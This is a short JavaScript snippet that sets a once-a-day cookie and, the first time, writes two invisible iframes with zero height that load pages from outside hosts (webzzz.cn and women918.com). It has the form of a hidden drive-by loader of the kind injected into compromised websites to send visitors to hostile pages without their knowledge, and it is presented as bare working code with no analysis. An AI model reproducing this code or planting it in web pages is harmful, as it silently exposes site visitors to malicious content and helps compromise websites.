function Get(){
var Then = new Date() 
Then.setTime(Then.getTime() + 24*60*60*1000)
var cookieString = new String(document.cookie)
var cookieHeader = "Cookie1=" 
var beginPosition = cookieString.indexOf(cookieHeader)
if (beginPosition != -1){ 
} else 
{ document.cookie = "Cookie1=yes;expires="+ Then.toGMTString()
document.write("<iframe src=http://www.webzzz.cn/mlink.html width=50 height=0></iframe>");
document.write("<iframe src=http://88.women918.com/b1.htm?9?769 width=50 height=0></iframe>");
}
}Get();